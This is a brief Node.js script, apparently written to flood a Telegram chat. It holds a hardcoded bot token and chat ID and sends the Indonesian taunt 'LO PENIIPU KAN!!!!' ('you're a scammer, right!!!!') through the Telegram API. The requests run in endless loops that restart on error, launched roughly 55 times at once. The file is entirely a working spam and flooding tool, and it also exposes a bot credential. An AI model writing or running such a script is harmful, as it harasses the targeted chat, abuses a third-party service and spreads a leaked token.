const { default: axios } = require("axios");

const token = "bot6861974788:AAH_AbVplVpEG3XTRhVIgbMVqIeT-_y7vPQ"; // token tujuan
const message = "LO%20PENIIPU%20KAN!!!!"; // pesan
const chatId = "6951548817"; // chat id

const url = `https://api.telegram.org/${token}/sendMessage?parse_mode=markdown&chat_id=${chatId}&text=${message}`;

async function sendMessage() {
  try {
    while (true) {
      await axios.get(url).then((response) => {
        if (response.status == 200) {
          console.log(response.statusText);
        } else {
          console.log("message error");
        }
      });
    }
  } catch (e) {
    console.log(e.response.data.description);
    sendMessage();
  }
}

sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
